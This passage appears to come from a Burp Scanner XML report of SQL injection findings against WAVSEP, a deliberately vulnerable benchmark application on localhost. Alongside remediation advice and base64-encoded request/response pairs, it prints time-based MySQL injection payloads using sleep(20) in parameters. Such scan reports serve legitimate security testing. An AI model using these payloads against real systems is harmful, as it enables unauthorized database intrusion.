ncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ4IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAxLUluamVjdGlvbkluTG9naW4tU3RyaW5nLUxvZ2luQnlwYXNzLVdpdGhFcnJvcnMuanNwP3VzZXJuYW1lPXRleHR2YWx1ZSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmInJnBhc3N3b3JkPXRleHR2YWx1ZTIgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzINCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6757429107991491584</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZScgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZScnIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVN0cmluZy1VbmlvbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/bXNnPXRleHR2YWx1ZSclMjBhbmQlMjAoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSktLSUyMCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4370623631446263808</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTAzLUluamVjdGlvbkluQ2FsYy1TdHJpbmctQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3A/dXNlcm5hbWU9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkyMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0NDowNiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTt0ZXh0dmFsdWUmIzM5OyYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxd